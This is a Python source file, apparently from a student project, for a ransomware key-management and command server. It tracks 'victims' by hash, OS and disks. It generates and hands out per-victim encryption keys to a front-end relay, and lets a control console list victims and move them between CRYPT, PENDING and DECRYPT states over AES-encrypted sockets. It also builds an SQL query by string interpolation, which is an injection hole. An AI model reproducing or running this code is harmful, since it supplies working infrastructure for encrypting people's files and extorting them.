# import socket
import datetime
import utile.network as network
import utile.message as message
import utile.data as data
# import random
# import string
import utile.security as security
import queue
import threading
import time

main_queue = queue.Queue()
front_thread_queue = queue.Queue()
console_thread_queue = queue.Queue()


def get_data_from_db(message_console, conn):
    global console_thread_queue
    global front_thread_queue
    global main_queue
    type_message = message.get_message_type(message_console)
    print("Type de message reçu : ", type_message)
    # Traiter le message reçu de type LIST_REQ
    if type_message == "LIST_REQ":
        victims = data.get_list_victims(conn)
        # Envoi de la réponse de type LIST_VICTIM_RESP (pour chaque victime)
        for victim in victims:
            message_response = message.set_message("LIST_RESP", victim)
            # STOCKAGE DANS LA QUEUE DU THREAD DE CONSOLE
            console_thread_queue.put(message_response)
        # Envoi de la réponse de type LIST_VICTIM_END
        message_end = message.set_message("LIST_END")
        console_thread_queue.put(message_end)
        # print la queue du thread de console
        print(console_thread_queue.queue)
    # Traiter le message reçu de type HIST_REQ
    elif type_message == "HIST_REQ":
        victim_id = message_console["HIST_REQ"]
        print(victim_id)
        # Récupérer l'historique en fonction de l'id de la victime
        history = data.get_list_history(conn, victim_id)
        # Envoi de la réponse de type HISTORY_RESP (pour chaque élément de l'historique)
        for hist in history:
            message_response = message.set_message("HIST_RESP", hist)
            console_thread_queue.put(message_response)
        # Envoi de la réponse de type HISTORY_END
        message_response = message.set_message("HIST_END")
        console_thread_queue.put(message_response)
    # Traiter le message reçu de type CHGSTATE
    elif type_message == "CHGSTATE":
        print(message_console)
        victim_id = message_console["CHGSTATE"]
        if message_console["STATE"] == "CRYPT":
            victim_id = data.select_data(conn, f"SELECT id_victim FROM victims WHERE hash = '{victim_id}'")[0][0]
            items = ["id_states", "id_victim", "datetime", "state"]
            contenu = [2, victim_id, datetime.datetime.now().timestamp(), "CRYPT"]
            data.insert_data(conn, "states", items, contenu)
        print(victim_id)
        # récupérer l'état actuel en fonction de l'id de la victime
        history = data.get_list_history(conn, victim_id)
        print(history)
        if len(history) > 0 and history[-1][3] != "CRYPT":
            # Récupérer le dernier état de la victime
            state = history[-1][3]
            if state == "PENDING":
                # Changer l'état de la victime
                items = ["id_states", "id_victim", "datetime", "state"]
                contenu = [4, victim_id, datetime.datetime.now().timestamp(), "DECRYPT"]
                data.insert_data(conn, "states", items, contenu)
                message_response = message.set_message("CHGSTATE", ["DECRYPT"])
                console_thread_queue.put(message_response)
            elif state == "DECRYPT":
                message_response = message.set_message("CHGSTATE", ["DECRYPTED"])
                console_thread_queue.put(message_response)
            else:
                message_response = message.set_message("CHGSTATE", [state])
                console_thread_queue.put(message_response)
    elif type_message == "INITIALIZE":
        print('Hello serveur clé')
        select_query = "SELECT hash, key FROM victims;"
        victims = data.select_data(conn, select_query)
        hash_victim = message_console["INITIALIZE"]
        print(hash_victim)
        found = False
        i = 0
        for i, victim in enumerate(victims):
            if hash_victim == victim[0]:
                history = data.get_list_history(conn, victim[2])
                params = [victim[0], victim[1], history[-1][3]]
                message_response = message.set_message("KEY_RESP", params)
                front_thread_queue.put(message_response)
                found = True
                break
        if not found:
            key = security.gen_key(512)
            items_victim = ["id_victim", "os", "hash", "disks", "key"]
            contenu_victim = [len(victims) + 1, message_console["OS"], hash_victim, str(message_console["DISKS"]), key]
            data.insert_data(conn, "victims", items_victim, contenu_victim)
            print(contenu_victim)
            items_state = ["id_states", "id_victim", "datetime", "state"]
            print(items_state)
            contenu_state = [1, len(victims) + 1, datetime.datetime.now().timestamp(), "INITIALIZE"]
            data.insert_data(conn, "states", items_state, contenu_state)

            message_response = message.set_message("KEY_RESP", [hash_victim, key, "INITIALIZE"])
            print("message_response", message_response)
            front_thread_queue.put(message_response)
            print("Coucou c envoyé")
    else:
        message_response = message.set_message("CHGSTATE", ["UNKNOWN"])
        console_thread_queue.put(message_response)


def handle_console(socket_server_console):
    global console_thread_queue
    global main_queue
    while True:
        client_socket, address = socket_server_console.accept()
        print(client_socket, address)
        key = security.diffie_hellman_recv_key(client_socket)
        encrypted_message_console = network.receive_message(client_socket)
        if encrypted_message_console is not None:
            message_console = security.aes_decrypt(encrypted_message_console, key)
            main_queue.put((message_console, client_socket, key))
        else:
            print("Message console reçu est None. Ignoré.")

        # Récupérer les réponses de la file d'attente console_thread_queue et les renvoyer à la console de contrôle
        while console_thread_queue.empty():
            pass
        else:
            # Récupérer les messages de la file d'attente (un oar un) jusqu'au list_end ou hist_end et les envoyer à la console
            while not console_thread_queue.empty():
                message_console = console_thread_queue.get()
                encrypted_message_console = security.aes_encrypt(message_console, key)
                network.send_message(client_socket, encrypted_message_console)

                # Si le message est de type LIST_END ou HIST_END, sortir de la boucle
                if message.get_message_type(message_console) in ["LIST_END", "HIST_END"]:
                    break


def handle_frontal(socket_server_frontal):
    print("Frontal server started")
    client_socket, address = socket_server_frontal.accept()
    print(client_socket, address)
    key = security.diffie_hellman_recv_key(client_socket)
    while True:
        encrypted_message_frontal = network.receive_message(client_socket)
        print("hello ii")
        if encrypted_message_frontal is not None:
            message_frontal = security.aes_decrypt(encrypted_message_frontal, key)
            main_queue.put((message_frontal, client_socket, key))
        else:
            print("Message frontal reçu est None. Ignoré.")
        while front_thread_queue.empty():
            pass
        else:
            while not front_thread_queue.empty():
                message_front = front_thread_queue.get()
                encrypted_message_front = security.aes_encrypt(message_front, key)
                network.send_message(client_socket, encrypted_message_front)


def main():
    socket_server_console = network.start_net_serv(port=8380)
    socket_server_frontal = network.start_net_serv(port=8381)
    conn = data.connect_db()
    if conn is not None:
        print("Base de données initialisée")

    console = threading.Thread(target=handle_console, args=(socket_server_console,))
    frontal = threading.Thread(target=handle_frontal, args=(socket_server_frontal,))

    console.start()
    frontal.start()

    while True:
        while not main_queue.empty():
            # Traiter les éléments de la file
            message_console, client_socket, key = main_queue.get()
            get_data_from_db(message_console, conn)


if __name__ == '__main__':
    main()
